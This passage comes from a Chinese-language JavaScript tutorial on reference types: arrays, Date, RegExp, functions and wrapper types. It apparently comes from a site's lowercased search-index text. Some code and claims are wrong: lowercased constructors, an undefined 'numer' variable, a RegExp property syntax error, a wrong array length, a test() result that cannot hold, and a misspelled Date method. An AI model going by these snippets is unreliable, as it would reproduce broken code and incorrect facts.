Math.floor(Math.random() * choices + lower); // 加lower自然是因为最后的区间从lower开始的\n}\nvar num = selectFrom(2, 10);    // 随机返回[2, 10]区间里的整数\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 7.2.5 其他方法\n\n方法                     说明               方法                说明\nMath.abs(num)          返回num的绝对值        Math.asin(x)      返回x的反正弦值\nMath.exp(num)          返回Math.E的num次幂   Math.atan(x)      返回x的反正切值\nMath.log(num)          返回num的自然对数       Math.atan2(y,x)   返回y/x的反正切值\nMath.pow(num, power)   返回num的power次幂    Math.cos(x)       返回x的余弦值\nMath.sqrt(num)         返回num的平方根        Math.sin(x)       返回x的正弦值\nMath.acos(x)           返回x的反余弦值         Math.tan(x)       返回x的正切值',normalizedContent:'# 引用类型\n\n\n\n * 一、object类型\n * 二、array类型\n   * 2.1 创建数组\n   * 2.2 isarray检测数组\n   * 2.3 tostring/valueof等转换方法\n   * 2.4 push/pop尾部添加移除\n   * 2.5 unshift/shift首部添加移除\n   * 2.6 reverse/sort重排序\n   * 2.7 concat/slice/splice拼接裁剪\n   * 2.8 indexof/lastindexof搜索项\n   * 2.9 every/some/filter/map/foreach迭代\n   * 2.10 reduce/reduceright归并\n * 三、date类型\n * 四、regexp类型\n   * 4.1 regexp实例属性\n   * 4.2 regexp实例方法\n   * 4.3 regexp构造函数属性\n   * 4.4 模式的局限性\n * 五、function类型\n   * 5.1 函数声明/函数表达式/构造函数的区别\n   * 5.2 没有重载\n   * 5.3 作为值的函数\n   * 5.4 函数内部属性(arguments/this)\n   * 5.5 函数属性和方法(apply/call/bind)\n * 六、基本包装类型\n   * 6.1 boolean包装类型\n   * 6.2 number包装类型\n   * 6.3 string包装类型\n     * 6.3.1 charat/charcodeat字符\n     * 6.3.2 concat/slice/substr/substring拼接裁剪\n     * 6.3.3 indexof/lastindexof搜索字符\n     * 6.3.4 trim删除空格\n     * 6.3.5 tolowercase/touppercase大小写转换\n     * 6.3.6 match/search模式匹配\n     * 6.3.7 replace/split替换和分割\n     * 6.3.8 localecompare比较\n     * 6.3.9 fromcharcode字符转换\n * 七、单体内置对象\n   * 7.1 global对象\n     * 7.1.1 uri编码\n     * 7.1.2 eval()方法\n     * 7.1.3 global对象的属性\n     * 7.1.3 window对象\n   * 7.2 math对象\n     * 7.2.1 math对象属性\n     * 7.2.2 min/max最大最小值\n     * 7.2.3 ceil/round/floor取整\n     * 7.2.4 random取随机数\n     * 7.2.5 其他方法\n\n\n\n引用类型是一种用于将 数据 和 功能 组织在一起的数据结构，也就是说它可以描述一类对象所具有的 属性 和 方法。那么某个对象（引用类型的值）是引用类型的一个实例。\nvar person = new object();新对像是使用new操作符后跟一个构造函数来创健的。\n\n\n# 一、object类型\n\nobject是ecmascript中使用最多的一个类型，创建object实例的方式有两种，一种是之前提到的new操作符后跟object构造函数，另一种是我们比较推荐使用的对象字面量表示法。\nvar person = new object();等价于var person = {};\n\n * {}里可以定义属性，如：var person = { age: 24 }; 这是一个对象上下文，若属性名是数值，会自动转为string；\n * 访问对象属性可使用点表示法也可使用方括号表示法，如：person["age"]和person.age；方括号表示法用在属性名不规范的情况下，比如含有空格等字符，点表示法就需要属性名尽可能像标识符那样规范。\n\n\n# 二、array类型\n\narray是ecmascript中除object最常用的类型，与其他语言不同的是它的每一项可保存 任何类型 的数据（位置0存字符串，位置1存数值，位置2存对象等等），并且数组大小是 动态调整 的（创建时的长度可随着新增的元素而变长）。\n\n\n# 2.1 创建数组\n\n创建数组有两种：\n\n第一种 自然是 new操作符后跟array构造函数（new可省略）\n\nvar colors = new array(3);      // 入参是数值3，创建长度为3的数组，入参也可以不传\nvar names = new array("greg");  // 入参不是数值，创建了一个包含“greg”元素的数组\n\n\n1\n2\n\n\n第二种 是使用 数组字面量表示法，var names = [];等价于var names = new array();，如果有[1, 2, ] 或 [ , , ,]，它可能在不同浏览器里有不同的效果，不推荐省略元素这种写法。\n\n关于 数组长度 (length)，length值比原数组大时，新数组新增出来的位置会使用undefined值填充，而length值比原数组小时，新数组会移除多出来的位置，可以访问多出来的位置但值是undefined\n\nvar colors = ["red", "blue", "green"];\ncolors[2] = "black";    // 修改数组第三项的值为"black"\ncolors[3] = "brown";    // 新增第四项"brown"\ncolors.length = 6;      // 增长数组，现数组：["red", "blue", "black", "brown", undefined, undefined]\ncolors.length = 2;      // 减短数组，现数组：["red", "blue"]，如果此时访问colors[4]那返回的是undefined\ncolors[99] = "black";   // 增长数组，现数组：["red", "blue", undefined, ..., undefined, "black"]，长度为99\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.2 isarray检测数组\n\n只有一个网页或一个全局执行环境是，我们使用instanceof就可以检测对象是不是数组。但是在多个网页或多个全局执行环境时，他们数组的构造函数版本不一样，导致判断不了，这时array.isarray()方法可以确定它是不是数组，不管它是在哪个全局执行环境中创建的。\n\n\n# 2.3 tostring/valueof等转换方法\n\n所有对象都有tostring()、tolocalestring()和valueof()，数组对象也有：\n\n * valueof()：返回的还是数组本身；\n * tostring()：把数组每一项的tostring()结果以字符串形式拼接起来，用逗号分隔；\n * tolocalestring()：把数组每一项的tolocalestring()结果以字符串形式拼接起来，用逗号分隔；\n * 除上述3个方法，数组还有join()方法，它其实是数组的tostring()方法返回结果把逗号换成了join()里的参数，没有参数则还是逗号，例如：join("||")就把,换成||；\n * 如果数组的某项是null或undefined的，那么在上述4中方法结果中以空字符串表示\n\n\n# 2.4 push/pop尾部添加移除\n\necmascript数组提供了一种类似于栈数据结构特点（后进先出）的方法：\n\nvar colors = ["red", "blue"];\ncolors.push("brown");       // 在数组末尾逐个添加push参数中的项，可以添加多项\nvar item = colors.pop();    // 移除数组末尾最后一项，并将结果返回给item，数组长度会减1\n\n\n1\n2\n3\n\n\n\n# 2.5 unshift/shift首部添加移除\n\n 1. ecmascript数组提供了一种类似于队列数据结构特点（先进先出）的方法：\n    \n    var colors = ["red", "blue"];\n    colors.push("black");\n    var item = colors.shift();    // 移除数组末尾第一项，并将结果返回给item，数组长度会减1\n    \n    \n    1\n    2\n    3\n    \n\n 2. 其实还有一个与shift相反的方法unshift()：\n    \n    var colors = ["red", "blue"];\n    var count = colors.unshift("black", "green"); // 在数组的手段推入两项，返回现数组长度4，其实跟push类似但作用位置不同\n    var item =  colors.pop(); // 移除了最尾端的一项，那么数组最后就是["green", "black", "red"]\n    \n    \n    1\n    2\n    3\n    \n\n\n# 2.6 reverse/sort重排序\n\n数组中用来重排序的方法有reverse()和sort()，其中reverse()会 反转 数组项的顺序；\nsort()按升序排列数组项，但它实际上先把每项调用tostring()转换成字符串比较再排序的，我们也知道字符串的比较时对应位置字符编码值的比较（一位一位进行比较，只要一位要结果后面的几位就不用看了）。\n所以sort()又有一种用法，把一个 比较函数 作为sort()的参数，比较函数有2个入参，如果第一个参数位于第二参数之后就返回正数（大于并返回正数），而位于之前就返回负数（小于并返回负数），相等就返回0，这样排序出来是 升序 的，降序的就是 大于并返回负数、小于并返回负数、等于返回0。\n\nfunction compare(v1, v2) {\n    if (v1 < v2) {\n        return -1;\n    } else if (v1 > v2) {\n        return 1;\n    } else {\n        return 0;\n    }\n    // return v1 - v2; // 前提是v1 v2是数值\n}\nvar values = [0, 10, 15, 1, 5];\nvalues.sort(compare);\nconsole.log(values); // [0, 1, 5, 10, 15]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n如果数组里的类型是引用类型，要对其某个属性进行排序，例：\n\nfunction comparisonfunction(propertyname) {\n    return function (object1, object2) {\n        var v1 = object1[propertyname];\n        var v2 = object2[propertyname];\n        if (v1 < v2) {\n            return -1;\n        } else if (v1 > v2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nvar values = [ { age: 3 }, { age: 10 }, { age: 15 }, { age: 1 }, { age: 5 } ];\nvalues.sort(comparisonfunction("age"));\nconsole.log(values); // [ { age: 1 }, { age: 3 }, { age: 5 }, { age: 10 }, { age: 15 } ]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 2.7 concat/slice/splice拼接裁剪\n\n 1. concat()会先创建当前数组的一个 副本，然后将接收到的参数添加到这个副本的 末尾。接收到的参数可以是 数组和单个项的混合体，是数组的话会把数组 每项 添到末尾。例：\n    \n    var colors = ["red", "green", "blue"];\n    var colors2 = colors.concat("yellow", ["black", "brown"]);\n    console.log(colors);     // ["red", "green", "blue"]，原数组不变创建了新数组来添加新元素到末尾\n    console.log(colors2);    // ["red", "green", "blue", "yellow", "black", "brown"]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. slice()会先创建当前数组的一个 副本，然后会按照参数去对应位置 截取 数组。例：\n    \n    var colors = ["red", "green", "blue", "yellow", "purple"];\n    var colors2 = colors.slice(1);       // 可以是一个参数，截取指定位置到末尾的项\n    var colors3 = colors.slice(1, 4);    // 可以是两个参数，截取[1, 4)位置的项\n    var colors4 = colors.slice(-2, -1);    // 如果参数有负数，会在负数上加上数组长度，也就是[3, 4]\n    console.log(colors);     // ["red", "green", "blue", "yellow", "purple"]，原数组不变\n    console.log(colors2);    // ["green", "blue", "yellow", "purple"]\n    console.log(colors3);    // ["green", "blue", "yellow"]\n    console.log(colors4);    // ["yellow"]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. splice()是操作 原数组本身，最后会返回删除的项组成的 数组；它有几个参数，第一个参数代表要操作的 位置，第二个参数代表从要操作的位置往后 删除几项，第三个以及后面的参数代表在删除位置上 新增的项。例：\n    \n    var colors = ["red", "green", "blue"];\n    var removed = colors.splice(1, 1, "red", "purple");\n    console.log(colors);     // ["red", "red", "purple", "blue"] 在位置1上删除1个元素，并添加"red"和"purple")\n    console.log(removed);    // ["green"] 删除的元素组成的数组\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 2.8 indexof/lastindexof搜索项\n\n 1. indexof(item, start)在数组的 start位置向右查找item，查找到以后返回该位置 索引，没有找到的话就返回 -1，如果没有start参数代表是从位置0开始向右查找的。\n 2. lastindexof(item, start)在数组的 start位置向左查找item，查找到以后返回该位置 索引，没有找到的话就返回 -1，如果没有start参数代表是从末尾开始向左查找的。\n\n\n# 2.9 every/some/filter/map/foreach迭代\n\necmascript5为数组定义了5个迭代方法，每个迭代方法都有两个参数：数组每项将要运行的函数和运行该函数的作用域对象（可选参数）。其中“运行的函数”有3个参数：数组的某项、该项索引、数组对象本身。\n\n 1. every()对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则最后返回true。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var everyresult = numer.every(function(item, index, array) {\n        return item > 2;\n    });\n    console.log(everyresult); // false，要每一项都大于2，最后结果才是true\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. some()对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则最后返回true。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var someresult = numer.some(function(item, index, array) {\n        return item > 2;\n    });\n    console.log(someresult); // true，只要有一项大于了2，最后就是true\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. filter()对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var filterresult = numer.filter(function(item, index, array) {\n        return item > 2;\n    });\n    console.log(filterresult); // [3, 4, 5, 4, 3]，只保留大于2的项，并将这些项组成新数组返回\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 4. map()对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var mapresult = numer.map(function(item, index, array) {\n        return item * 2;\n    });\n    console.log(mapresult); // [2, 4, 6, 8, 10, 8, 6, 4, 2]，对每一项都乘以2（可以是其他操作），并组成新数组返回\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 5. foreach()对数组中的每一项运行给定函数，没有返回值，淡出的遍历数组而去操作某个动作。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var eachresult = numer.foreach(function(item, index, array) {\n        // 执行某些操作\n    });\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 2.10 reduce/reduceright归并\n\necmascript为数组新增了两个归并方法，都有2个参数：数组每项将要运行的函数和作为归并基础的初始值。这个“运行的函数”有4个参数：前一个值，当前值，当前值的索引，数组对象。\n\n 1. reduce()从数组的第一项开始遍历，然后构建一个最终返回值。构建树结构目录 (floating-toc.js)比较常用reduce归并方法，因为时候需要与前一项或者说归并值进行比较。\n    \n    var values = [1, 2, 3, 4, 5];\n    var sum = values.reduce(function(pre, cur, index, array) {\n        return pre + cur; // 这里构建的规则自己定义\n    })\n    console.log(sum); // 15\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. reduceright()从数组的最后一项往前遍历，然后构建一个最终返回值。\n    \n    var values = [1, 2, 3, 4, 5];\n    var sum = values.reduceright(function(pre, cur, index, array) {\n        return pre + cur; // 这里构建的规则自己定义\n    })\n    console.log(sum); // 15\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 三、date类型\n\n * ecmascript中的date类型是在早起java中的java.util.date类基础上构建的，date类型使用自utc（国际协调时间）1970年1月1日午夜（零时）开始经过的毫秒数 来保存日期。\n * 创建一个日期对象，使用new操作符和date构造函数：var now = new date();新创建的对象 自动获得当前日期和时间，date构造函数可接受参数，参数一般是 毫秒数。\n * 在web应用中，new date(xxx)一般使用在时间显示组件中，这些组件是前端框架已经封装好了的，所以在业务代码中极少见到这种new date(xxx)，只需把毫秒数传给组件即可。\n * date类型的tolocalestring()会按照与浏览器设置的地区相适应的格式返回日期和时间。而tostring()会返回带有时区信息的日期和时间，valueof()会返回日期的毫秒表示。三种多用于调试。\n * 再介绍date类型的日期/时间组件方法，注：utc日期指0时区（没有时区偏差）的日期值。\n\n方法                       说明\ngettime()                返回表示日期的毫秒数；与valueof()方法返回的值相同\nsettime(毫秒)              以毫秒数设置日期，会改变整个日期\ngetfullyear()            取得4位数的年份（如2007而非07）\ngetutcfullyear()         返回utc日期的4位数年份\nsetfullyear(年)           设置日期的年份，传入的年份值必须是4位数字（如2007而非07）\nsetutcfullyear(年)        设置utc日期的年份，传入的年份值必须是4位数字（如2007而非07）\ngetmonth()               返回日期中的月份，其中0表示一月，11表示十二月\ngetutcmonth()            返回utc日期中的月份，其中0表示一月，11表示十二月\nsetmonth(月)              设置日期的月份，传入的月份值必须大于0，超过11则增加年份\nsetutcmonth(月)           设置utc日期的月份，传入的月份值必须大于0，超过11则增加年份\ngetdate()                返回日期月份中的天数（1到31）\ngetutcdate()             返回utc日期月份中的天数（1到31）\nsetdate(日)               设置日期月份中的天数，如果传入的值超过了该月中应有天数，则增加月份\nsetutcdate(日)            设置utc日期月份中的天数，如果传入的值超过了该月中应有天数，则增加月份\ngetday()                 返回日期中星期的星期几（其中0表示星期日，6表示星期6）\ngetutcday()              返回utc日期中星期的星期几（其中0表示星期日，6表示星期6）\ngethours()               返回日期中的小时数（0到23）\ngetutchours()            返回utc日期中的小时数（0到23）\nsethours(时)              设置日期中的小时数，传入的值超过了23则增加月份中的天数\nsetutchours(时)           设置utc日期中的小时数，传入的值超过了23则增加月份中的天数\ngetminutes()             返回日期中的分钟数（0到59）\ngetutcminutes()          返回utc日期中的分钟数（0到59）\nsetminutes(分)            设置日期中的分钟数，传入的值超过59则增加小时数\nsetutcminutes(分)         返回utc日期中的分钟数，传入的值超过59则增加小时数\ngetseconds()             返回日期中的秒数（0到59）\ngetutcseconds()          返回utc日期中的秒数（0到59）\nsetseconds(秒)            设置日期中的秒数，传入的值超过59则增加分钟数\nsetutcseconds(秒)         返回utc日期中的秒数，传入的值超过59则增加分钟数\ngetmilliseconds()        返回日期中的毫秒数\ngetutcmilliseconds()     返回utc日期中的毫秒数\nsetmilliseconds(毫秒)      设置日期中的毫秒数\nsetutcmilliseconds(毫秒)   设置utc日期中的毫秒数\nsettimezoneoffest()      返回本地时间与utc时间相差的分钟数\n\n\n# 四、regexp类型\n\necmascript通过regexp类型来支持正则表达式，var exp = /pattern/flags;模式（pattern）部分可以是任何简单或复杂的 表达式（可以包含 字符类、限定符、分组、向前查找以及反向引用）。而flags可以有对个，用以标明正则表达式的 行为。\n\n正则表达式的匹配模式支持3个标志：\n\n * g：表示全局（global）模式，在发现第一个匹配项时不会立即停止，会继续往后匹配所有。\n * i：表示不区分大小写（case-insensitive）模式，确定匹配项时忽略模式与字符串的大小写。\n * m：表示多行（multiline）模式，在到大一行文本末尾时，还会继续查找下一行。\n\n元字符需要用\\转义：([{\\^$|)?*+.]}\n\n创建正则表达式除了用字面量形式以外，还可以用regexp构造函数，例：\n\nvar pattern1 = /[bc]at/i;   // 匹配第一个“bat”或“cat”，不区分大小写\nvar pattern2 = new regexp("[bc]at", "i");   // 与pattern1相同\n\n\n1\n2\n\n\n这种形式的不同点：\n\n * 字面量形式里的元字符对应到构造函数的字符串里要 再转义一遍，例如字面量/\\w\\\\hello\\\\123/对应构造函数字符串"\\\\w\\\\\\\\hello\\\\\\\\123"\n * 在ecmascript3时，正则表达式字面量始终会共享同一个regexp实例，而构造函数创建的每一个对象都是一个新regexp实例，例如在for循环体中操作两种情形时的正则表达式，结果会大不一样，但在 ecmascript5，这两种方式每次 都创建新的regexp实例\n\n\n# 4.1 regexp实例属性\n\nregexp的每个实例都具有下列属性：\n\n * global：布尔值，表示是否设置了g标志；\n * ignorecase：布尔值，表示是否设置了i标志；\n * lastindex：整数，表示开始搜索下一个匹配项的字符位置，从0算起；\n * multiline：布尔值，表示是否设置了m标志；\n * source：正则表达式的字符串表示，按照字面量形式返回（构造函数中的字符串去掉元字符的\\符号）\n\nvar pattern = new regexp("\\\\[bc\\\\]at", "i");\nconsole.log(pattern.global);        // false\nconsole.log(pattern.ignorecase);    // true\nconsole.log(pattern.lastindex);     // 0\nconsole.log(pattern.multiline);     // false\nconsole.log(pattern.source);        // "\\[bc\\]at"\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 4.2 regexp实例方法\n\n 1. exec()专为捕获组设计，exec()接受一个参数（要应用的字符串），返回与捕获组相关的数组（没有匹配项则返回null），这个返回值还有两个额外属性：input和index\n    \n    var text = "cat, bat, sat, fat";\n    var pattern = /.at/g;\n    var matches = pattern.exec(text);\n    console.log(matches.index);      // 0，表示匹配项在字符串中的位置，而input就是text值\n    console.log(matches[0]);         // cat，第一个捕获组\n    console.log(matches.lastindex);  // 3表示开始搜索下一个匹配项的字符位置\n    matches = pattern.exec(text);\n    console.log(matches.index);      // 5，逗号后有一个空格是4，b才是5\n    console.log(matches[0]);         // bat\n    console.log(matches.lastindex);  // 8\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n    \n    在设置全局标志的情况下，每次调用exec()则都会在字符串中继续查找新匹配项，而没设置全局标志则会一直灰灰第一个匹配项不早醒的匹配项。\n\n 2. test()判断目标字符串与某个模式是否匹配\n    \n    var text = "000-00-000";\n    var pattern = /\\d{3}-\\d{2}-\\d{4}/;\n    console.log(pattern.test(text)); // true\n    \n    \n    1\n    2\n    3\n    \n\n 3. regexp实例继承的tolocalestring()和tostring()方法都会返回正则表达式的字面量（是构造函数创建的正则表达式也如此）。valueof()方法返回正则表达式本身。\n\n\n# 4.3 regexp构造函数属性\n\n在其他语言被看作静态属性。适用于作用域中的所有正则表达式，并且基于所执行的最近一次正则标的是操作而变化。\n\n长属性名           短属性名   说明\ninput          $_     最近一次要匹配的字符串\nlastmatch      $&     最近一次的匹配项\nlastparen      $+     最近一次匹配的捕获组\nleftcontext    $`     input字符串中lastmatch之前的文本\nmutiline       $*     布尔值，表示是否所有表达式都使用多行模式\nrightcontext   $\'     input字符串中lastmatch之后的文本\n\nvar text = "this has been a short summer";\nvar pattern = /(.)hort/g;\nif (pattern.test(text)) {\n    console.log(regexp.$_);         // "this has been a short summer"\n    console.log(regexp.["$`"]);     // "this has been a "\n    console.log(regexp.["$\'"]);     // " summer"\n    console.log(regexp.["$&"]);     // "short"\n    console.log(regexp.["$+"]);     // "s"\n    console.log(regexp.["$*"]);     // false\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n除了上面这些属性还有多达9个用于存储捕获组的构造函数属性：$1、$2、$3 ... $9，例：\n\nvar text = "this has been a short summer";\nvar pattern = /(..)or(.)/g;\nif (pattern.test(text)) {\n    console.log(regexp.$1);     // "sh"\n    console.log(regexp.$2);     // "t"\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 4.4 模式的局限性\n\n缺少某些语言所支持的高级正则表达式特性：\n\n * 匹配字符串开始和结尾的\\a和\\2锚（但支持匹配字符串的开始用^结尾用$）\n * 向后查找（但完全支持向前查找）\n * 并集和交集类\n * 原子组\n * unicide支持（单个字符除外，如\\uffff）\n * 命名的捕获组\n * s（单行）和x（无间隔）匹配模式\n * 条件匹配\n * 正则表达式注释\n\n\n# 五、function类型\n\n每个函数都是function类型的实例，而且都与其他应用类型一样具有属性和方法。函数名实际上是一个指向函数对象的指针，不会与某个函数绑定。\n\n函数有3种方式定义：\n\n// 函数声明\nfunction sum1(num1, num2) {\n    return num1 + num2;\n}\n// 函数表达式\nvar sum2 = function (num1, num2) {\n    return num1 + num2;\n};\n// 构造函数\nvar sum3 = new function("num1", "num2", "return num1 + num2");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n第一种函数声明和第二种函数表达式几乎相差无几，而第三种function构造函数我们不推荐使用，因为最后一个参数是动态代码字符串。\n\n\n# 5.1 函数声明/函数表达式/构造函数的区别\n\n 1. 函数声明：js整体一边编译一边执行，但在一个代码段里，是 先编译后执行。比如下面这段代码里，编译器先走，走到了function sum(num1, num2)时，编译器会去 变量对象 里查找sum，发现没有这个变量，就声明了一个名为sum并且类型是 function 的变量（因为function是 声明的关键字，所以它的类型是function），并放在了 变量对象 里；编译完后 引擎开始执行代码，因为function sum(num1, num2)在编译器 已经提升了（代码段里先编译后执行） 所以会提前执行，给sum指引一个function实例化对象，然后走到sum()去执行这个函数。也就是说不管sum()是在 函数声明前还是声明后执行 都不会报锗，这样的过程叫 函数声明提升。\n    \n    sum();                      // 执行代码，编译期会忽略这里\n    function sum(num1, num2) {  // 编译到这，声明提升了\n        return num1 + num2;\n    }\n    /*****************等价于******************/\n    function sum(num1, num2) {  // 编译到这，声明提升了\n        return num1 + num2;\n    }\n    sum();\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 函数表达式：编译器走到var sum时，只知道sum是个普通变量，不知道它在 执行期 会接收function的实例化对象，所以它没有 函数声明提升（只是普通声明）。当引擎执行到sum = function (num1, num2)时，会把新创建的函数对象让sum指引着，然后继续去执行sum()，正常调用函数。如果sum()在函数表达式之前，那就会报错，因为sum没有函数声明提升，必须等function实例赋值给sum后才能去调用这个函数，这也是函数表达式与函数声明的 唯一区别。\n    \n    var sum = function (num1, num2) { return num1 + num2; };\n    sum();\n    /*****************下面会报错***************/\n    sum();\n    var sum = function (num1, num2) { return num1 + num2; };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. function构造函数：与函数表达式有些类似，编译器走到var sum时，只知道sum是个普通变量，不知道它在 执行期 会接收function的实例化对象；但不同的是，“函数表达式”在调用时会 先编译 生成 函数的执行环境，编译器认为num1、num2是变量，return是个执行语句，而“function构造函数”虽说也生成函数的执行环境，编译器也认为num1、num2是变量，但是第三个参数是个字符串，在函数的 执行期 才把第三个参数这个字符串解析编译出来，再执行这个代码（函数表达式却是直接执行return）。总的来说就是“function构造函数”在执行期比“函数表达式”多一步 动态代码字符串解析编译，极耗性能，这也是我们 不推荐使用“function构造函数”的原因，不说性能就字符串里写代码的稳定性就不好。\n    \n    var sum = new function("num1", "num2", "return num1 + num2");\n    sum();\n    \n    \n    1\n    2\n    \n\n\n# 5.2 没有重载\n\n * 重写 子类覆盖父类的方法（返回值和形参都不能改变，方法体改变了，也就是核心变了），在js里重写是可以的。\n * 重载：在同一个类里（执行环境），方法名相同而形参列表和方法体不一样的函数叫重载，这在js里是不存在的。\n * 因为js里使用var和function这样的关键字来声明 同名变量 时，都会以最后一个声明为准，它会覆盖之前所有 同名 的声明；js里的同名函数的声明就是重载的写法，因为在同一个执行环境里，但由于同名的会被覆盖，那么js里没有函数重载这一说法。\n\nfunction addsomenumber(num) {\n  return num + 100;\n}\nfunction addsomenumber(num) {\n  return num + 200;\n}\nvar result = addsomenumber(100); // addsomenumber被定义了2次，后定义的会覆盖先定义的\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 5.3 作为值的函数\n\n函数名是一个指针变量，那么函数对象可以作为一个值来使用，比如作为参数和返回值。\n\n\n# 5.4 函数内部属性(arguments/this)\n\n函数内部有两个特殊对象：arguments和this，在之前的1.基础语法#函数里有介绍arguments，在2.变量、作用域和内存问题#执行环境及作用域里介绍过this。\n\narguments有一个callee属性，是一个指向拥有当前arguments的函数对象的指针。\n\nfunction factorial(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * arguments.callee(num - 1); // 是 num * factorial(num - 1)的解耦形式\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n函数内部还有一个caller属性（ecmascript5规范的），这个属性保存着 调用当前函数 的 函数 的 引用，如果实在全局作用域中调用的当前函数，caller则为null。可以结合arguments的callee指代当前函数来使用，例：\n\nfunction outer() {\n    inner();\n}\nfunction inner() {\n    console.log(arguments.callee.caller); // outer函数的原码\n}\nouter();\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n注意：严格模式下，访问arguments.callee会导致错误，也不能为函数的caller属性赋值。\n\n\n# 5.5 函数属性和方法(apply/call/bind)\n\n 1. 函数都有两个属性，可在内部和外部使用：length和prototype。通过函数名加上.来使用。\n    \n    * length属性表示函数 希望接收的命名参数的个数，并不是指实际参数个数。\n    * prototype属性是 保存 它们 所有实例方法 的真正存在。\n\n 2. 函数都有两个非继承而来的方法：apply()和call()。通过函数名加上.来使用。\n    \n    * 这两个方法是用来设置当前函数的this对象的值，改变函数所处的执行环境\n    * apply()和call()有多个入参时，第一个参数将作为 新执行环境；第二个参数apply是使用 形参的数组形式，而call是 形参本身的形式。apply()和call()只有一个参数时，自然是把这个参数设置为当前函数的this，也就是少了传参。\n    \n    function add(c, d) {\n        return this.a + this.b + c + d;\n    }\n    var s = { a: 1, b: 2 };\n    console.log(add.apply(s, [3, 4]));  // 10\n    console.log(add.call(s, 5, 6));     // 14\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n    * ecmascript5定义了一个bind()，与apply()和call()类似，除了把参数设置为当前函数的this值以外，bind()还会创建一个函数的实例，bind()的传参与call一样是 形参本身的形式。\n    \n    window.color = "red";\n    var o = { color: "blue" };\n    function saycolor() {\n        console.log(this.color);\n    }\n    var objectsaycolor = saycolor.bind(o); // 不用立即执行，到后面想执行时使用实例对象执行\n    objectsaycolor(); // "blue"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 3. 除了上述方法，函数还有几层的tolacalestring()、tostring()、valueof()，都是用来返回 函数源码 的，返回的格式因浏览器而异。\n\n\n# 六、基本包装类型\n\necmascript有6种数据类型，其中undefined、null、boolean、number、string是简单（基本）类型，剩下的object是一种复杂数据类型。\n在操作布尔值、数值和字符串时，后台会隐式创建一个对应的 基本包装类型 的对象，从而提供一些操作方法（实例上的方法），操作完会立即销毁这个对象，若要重新调用这个对象其实又隐式创建了 基本包装类型 的对象。\n上述是操作布尔值、数值和字符串，即基本包装类型有三种：boolean、number、string。\n\nvar s1 = "some text"; // 这里隐式创建string包装类型，相当于var s1 = new string("some text");\ns1.color = "red";\nconsole.log(s1.color); // undefined，上一行代码执行完，s1对应基本包装类型的对象就销毁了，这里使用时是重现隐式创建了，所以color属性就没有了\n\n\n1\n2\n3\n\n\nvar value = "25";\nvar number = number(value);     // 转型函数\nconsole.log(typeof number);     // "number"\nvar obj = new number(value);    // 构造函数\nconsole.log(typeof obj);        // "object"\n\n\n1\n2\n3\n4\n5\n\n\n上面这个例子也说明了三种数据基本类型和对应基本包装类型的区别了，实际上我们不建议显示地创建基本包装类型的对象，容易让人分不清是在处理基本类型还是引用类型（基本包装类型是引用类型）。\n\n\n# 6.1 boolean包装类型\n\nboolean包装类型 是布尔值对应的 引用类型，创建对象调用boolean构造函数时传入true或false，在使用这个对象时很容易造成误解，所以 不推荐显式构造boolean包装类型。\n\nvar falseoject = new boolean(false);    // 显式的使用了boolean包装类型\nvar result = falseobject && true;       // 此时falseobject是个对象，隐式的调用了boolean(falseobject)，结果为true\nconsole.log(result);                    // true\n\n\n1\n2\n3\n\n\n跟其他应用类型一样，继承了valueof()、tostring()、tolocalestring()方法，可以使用instanceof来区分布尔的基本类型和包装类型。\n\nvar falseoject = new boolean(false);\nvar falsevalue = false;\nconsole.log(falseoject instanceof boolean); // true\nconsole.log(falsevalue instanceof boolean); // false\n\n\n1\n2\n3\n4\n\n\n\n# 6.2 number包装类型\n\nnumber包装类型是数值对应的引用类型，创建对象调用number构造函数时传入相应的数值，与boolean包装类型的对象一样在使用时容易造成误解不推荐显式使用。\n\n同样的，number包装类型也继承有valueof()、tostring()、tolocalestring()方法；它有还提供了一些将数值格式转为字符串的方法：\n\n * tofixed()：按照指定的 小数位 返回数值的字符串表示；\n * toexponential()：返回以指数表示法的数值的字符串形式；\n * toprecision()：按照指定位数以合适的形式（指数或小数）返回数值的字符串形式。\n\nvar num = 99;\nconsole.log(num.toprecision(1));    // 